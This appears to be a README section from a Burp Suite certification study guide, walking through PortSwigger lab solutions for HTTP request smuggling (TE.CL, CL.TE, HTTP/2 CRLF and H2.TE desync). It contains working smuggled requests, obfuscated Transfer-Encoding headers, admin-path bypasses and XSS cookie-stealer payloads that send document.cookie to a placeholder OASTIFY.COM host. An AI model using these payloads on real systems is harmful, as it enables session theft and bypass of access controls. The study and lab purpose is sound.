<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">HTTP Request Smuggling</h2><a id="user-content-http-request-smuggling" class="anchor" aria-label="Permalink: HTTP Request Smuggling" href="#http-request-smuggling"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Architecture with front-end and back-end server, and front-end or back-end does not support chunked encoding <strong>(HEX)</strong> or content-length <strong>(Decimal)</strong>. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.</p>
</blockquote>
<p dir="auto"><a href="#tecl-dualchunk---transfer-encoding-obfuscated">TE.CL dualchunk - Transfer-encoding obfuscated</a><br>
<a href="#tecl-multiCase---admin-blocked">TE.CL multiCase - Admin blocked</a><br>
<a href="#clte-multicase---admin-blocked">CL.TE multiCase - Admin blocked</a><br>
<a href="#clte-multicase---content-length">CL.TE multiCase - Content-Length Cookie Stealer</a><br>
<a href="#clte-multicase---user-agent-cookie-stealer">CL.TE multiCase - User-Agent Cookie Stealer</a><br>
<a href="#http2-smuggling-via-crlf-injection">HTTP/2 smuggling - CRLF injection Cookie Stealer</a><br>
<a href="#http2-te-desync-v10a-h2path">HTTP/2 TE - Admin Cookie Stealer</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">TE.CL dualchunk - Transfer-encoding obfuscated</h3><a id="user-content-tecl-dualchunk---transfer-encoding-obfuscated" class="anchor" aria-label="Permalink: TE.CL dualchunk - Transfer-encoding obfuscated" href="#tecl-dualchunk---transfer-encoding-obfuscated"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">If Duplicate header names are allowed, and the vulnerability is detected as <strong>dualchunk</strong>, then add an additional header with name and value = <strong>Transfer-encoding: cow</strong>.  Use <strong>obfuscation</strong> techniques with second TE.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-encoding: identity
Transfer-encoding: cow"><pre class="notranslate"><code>Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-encoding: identity
Transfer-encoding: cow
</code></pre></div>
<blockquote>
<p dir="auto">Some servers that do support the <code>Transfer-Encoding</code> header can be induced not to process it if the header is <strong>obfuscation</strong> in some way.</p>
</blockquote>
<blockquote>
<p dir="auto">On Repeater menu ensure that the <strong>"Update Content-Length"</strong> option is unchecked.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

e6
GET /post?postId=4 HTTP/1.1
User-Agent: a&quot;/&gt;&lt;script&gt;document.location='http://OASTIFY.COM/?c='+document.cookie;&lt;/script&gt;
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n  
\r\n
  "><pre>POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

e6
GET /post?postId=4 HTTP/1.1
User-Agent: a"/<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-c1">=</span><span class="pl-s">'http://OASTIFY.COM/?c='</span><span class="pl-c1">+</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n  
\r\n
  </pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/gpost.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/gpost.png" alt="GPost Obfuscating the TE header" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><strong>Note:</strong> You need to include the trailing sequence <strong>\r\n\r\n</strong> following the final <strong>0</strong>.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header" rel="nofollow">PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header</a></p>
<blockquote>
<p dir="auto">Wonder how often this scenario occur that hacker is able to steal visiting user request via HTTP Sync vulnerability?</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">TE.CL multiCase - Admin blocked</h3><a id="user-content-tecl-multicase---admin-blocked" class="anchor" aria-label="Permalink: TE.CL multiCase - Admin blocked" href="#tecl-multicase---admin-blocked"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">When attempting to access <code>/admin</code> portal URL path, we get the filter message, <code>Path /admin is blocked</code>. The HTTP Request Smuggler scanner <em><strong>identify</strong></em> the vulnerability as <code>TE.CL multiCase (delayed response)</code>. <strong>Note:</strong> because back-end server doesn't support chunked encoding, turn off <code>Update Content-Length</code> in Repeater menu.</p>
</blockquote>
<blockquote>
<p dir="auto">After disable auto content length update, changing to <code>HTTP/1.1</code>, then send below request twice, adding the second header <code>Content-Length: 15</code> prevent the HOST header conflicting with first request.<br>
<strong>Note:</strong> need to include the trailing sequence <code>\r\n\r\n</code> following the final <code>0</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in <strong>HEXADECIMAL</strong>, and <strong>Content-Length</strong> specifies the length of the message body in <strong>bytes</strong>. Chunks are followed by a <strong>newline</strong>, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
"><pre>POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0</pre></div>
<blockquote>
<p dir="auto">Calculating TE.CL (Transfer-Encoding / Content-Length) smuggle request length in <strong>HEXADECIMAL</strong> and the payload is between the hex length of <strong>71</strong> and the terminating <strong>ZERO</strong>, not including the ZERO AND not the preceding <code>\r\n</code> on line above ZERO, as part of length. The initial POST request <strong>content-length</strong> is manually set.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/te.cl.multicase-smuggle.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/te.cl.multicase-smuggle.png" alt="te.cl.multicase-smuggle.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">When sending the <code>/admin/delete?username=carlos</code> to delete user, the transfer encoding hex length is changed from <code>71</code> to <code>88</code> hexadecimal value to include extra smuggled request size.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" rel="nofollow">PortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">CL.TE multiCase - Admin blocked</h3><a id="user-content-clte-multicase---admin-blocked" class="anchor" aria-label="Permalink: CL.TE multiCase - Admin blocked" href="#clte-multicase---admin-blocked"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">When attempting to access <code>/admin</code> portal URL path, we get the filter message, <code>Path /admin is blocked</code>. The HTTP Request Smuggler scanner <em><strong>identify</strong></em> the vulnerability as <code>CL.TE multiCase (delayed response)</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">To access the admin panel, send below request twice, adding the second header <code>Content-Length: 10</code> prevent the HOST header conflicting with first request.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST / HTTP/1.1
Host: TARGET.net
Cookie: session=waIS6yM79uaaNUO4MnmxejP2i6sZWo2E
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
tRANSFER-ENCODING: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x="><pre>POST / HTTP/1.1
Host: TARGET.net
Cookie: session=waIS6yM79uaaNUO4MnmxejP2i6sZWo2E
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
tRANSFER-ENCODING: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=</pre></div>
<blockquote>
<p dir="auto">On the second time the request is send the admin portal is returned in response.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cl.te-multicase-admin-blocked.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cl.te-multicase-admin-blocked.png" alt="cl.te multicase admin blocked" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" rel="nofollow">PortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">CL.TE multiCase - Content-Length</h3><a id="user-content-clte-multicase---content-length" class="anchor" aria-label="Permalink: CL.TE multiCase - Content-Length" href="#clte-multicase---content-length"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Large Content-Length to capture victim requests. Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to <strong>798</strong>, then smuggle POST request to the back-end server.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 798
Cookie: session=HackerCurrentCookieValue

csrf=ValidCSRFCookieValue&amp;postId=8&amp;name=c&amp;email=c%40c.c&amp;website=&amp;comment=c"><pre>POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 798
Cookie: session=HackerCurrentCookieValue

csrf=ValidCSRFCookieValue&amp;postId=8&amp;name=c&amp;email=c%40c.c&amp;website=&amp;comment=c</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/content-length-capture-victim-request.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/content-length-capture-victim-request.png" alt="Exploiting HTTP request smuggling with content-length value" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">No new line at end of the smuggled POST request above^^.</p>
</blockquote>
<blockquote>
<p dir="auto">View the blog <strong>post</strong> to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/victim-request-captured-blog-comment.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/victim-request-captured-blog-comment.png" alt="Exploiting HTTP request smuggling to capture other users' requests" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" rel="nofollow">PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">CL.TE multiCase - User-Agent Cookie Stealer</h3><a id="user-content-clte-multicase---user-agent-cookie-stealer" class="anchor" aria-label="Permalink: CL.TE multiCase - User-Agent Cookie Stealer" href="#clte-multicase---user-agent-cookie-stealer"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the UserAgent value is stored in the GET request loading the blog comment form, and stored in <strong>User-Agent</strong> hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using <strong>User-Agent</strong> value that is then placed in a smuggled request.</p>
</blockquote>
<blockquote>
<p dir="auto">Basic Cross Site Scripting Payload escaping out of HTML document.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content=" &quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;"><pre> "/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</pre></div>
<blockquote>
<p dir="auto">COOKIE STEALER Payload.</p>
</blockquote>
<div class="highlight highlight-source-js notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="a&quot;/&gt;&lt;script&gt;document.location='http://OASTIFY.COM/?cookiestealer='+document.cookie;&lt;/script&gt;"><pre><span class="pl-s1">a</span>"/&gt;&lt;script&gt;document.location='http://OASTIFY.COM/?cookiestealer='+document.cookie;&lt;/script&gt;</pre></div>
<blockquote>
<p dir="auto">Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in <strong>User-Agent</strong> header.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST / HTTP/1.1
Host: TARGET.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a&quot;/&gt;&lt;script&gt;document.location='http://OASTIFY.COM/?Hack='+document.cookie;&lt;/script&gt;
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1"><pre>POST / HTTP/1.1
Host: TARGET.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a"/<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-c1">=</span><span class="pl-s">'http://OASTIFY.COM/?Hack='</span><span class="pl-c1">+</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/user-agent-cookie-stealer-smuggled.PNG"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/user-agent-cookie-stealer-smuggled.PNG" alt="HTTP request smuggling to deliver reflected XSS and steal victim cookie" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Check the PortSwigger Collaborator Request received from victim browsing target.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/collaborator-xss-Request-received.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/collaborator-xss-Request-received.png" alt="Collaborator capture XSS Request from victim browsing target" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" rel="nofollow">PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">HTTP/2 smuggling via CRLF injection</h3><a id="user-content-http2-smuggling-via-crlf-injection" class="anchor" aria-label="Permalink: HTTP/2 smuggling via CRLF injection" href="#http2-smuggling-via-crlf-injection"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target is vulnerable to request smuggling because the front-end server <strong>downgrades HTTP/2</strong> requests and fails to adequately sanitize incoming headers. Exploitation is by use of an HTTP/2-exclusive request smuggling vector to steal a victims session cookie and gain access to user's account.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> possible vulnerability when Target reflect previous and recent search history based on cookie, by removing cookie it is noticed that your search history is reset, confirming that it's tied to your session cookie.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/recent-searchs.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/recent-searchs.png" alt="recent searches" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Expand the Inspector's Request Attributes section and change the protocol to HTTP/2, then append arbitrary header <code>foo</code> with value <code>bar</code>, follow with the sequence <code>\r\n</code>, then followed by the <code>Transfer-Encoding: chunked</code>, by pressing <strong>shift+ENTER</strong>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/http2-inspector.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/http2-inspector.png" alt="http2-inspector" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Note: enable the <strong>Allow HTTP/2 ALPN override</strong> option and change the body of HTTP/2 request to below POST request.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=HACKER-SESSION-COOKIE
Content-Length: 800

search=nutty"><pre>0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=HACKER-SESSION-COOKIE
Content-Length: 800

search=nutty</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/http2-smuggle-via-crlf-inject.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/http2-smuggle-via-crlf-inject.png" alt="http2 smuggle via crlf inject" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection" rel="nofollow">PortSwigger Lab: HTTP/2 request smuggling via CRLF injection</a></p>
<p dir="auto"><a href="https://youtu.be/E-bnCGzl7Rk" rel="nofollow">Youtube demo HTTP/2 request smuggling via CRLF injection</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">HTTP/2 TE desync v10a h2path</h3><a id="user-content-http2-te-desync-v10a-h2path" class="anchor" aria-label="Permalink: HTTP/2 TE desync v10a h2path" href="#http2-te-desync-v10a-h2path"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Steal the  session cookie, of the admin visiting the target. The Burp extension, <strong>HTTP Request Smuggler</strong> will <em><strong>identify</strong></em> the vulnerability as HTTP/2 TE desync v10a (H2.TE) vulnerability.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/HTTP2-TE-desync-v10a-h2path.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/HTTP2-TE-desync-v10a-h2path.png" alt="HTTP/2 TE desync v10a h2path" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Note: Switch to <strong>HTTP/2</strong> in the inspector request attributes and Enable the <strong>Allow HTTP/2 ALPN override</strong> option in repeat menu.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="POST /x HTTP/2
Host: TARGET.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net\r\n
\r\n"><pre>POST /x HTTP/2
Host: TARGET.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net\r\n
\r\n</pre></div>
<blockquote>
<p dir="auto">Note: Paths in both POST and GET requests points to non-existent endpoints. This help to <em><strong>identify</strong></em> when not getting a 404 response, the response is from victim user captured request. <strong>Remember</strong> to terminate the smuggled request properly by including the sequence <code>\r\n\r\n</code> after the Host header.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/302-stolen-admin-cookie.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/302-stolen-admin-cookie.png" alt="302 Response once stolen admin cookie request captured" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Copy stolen session cookie value into new <strong>http/2</strong> GET request to the admin panel.</p>
</blockquote>
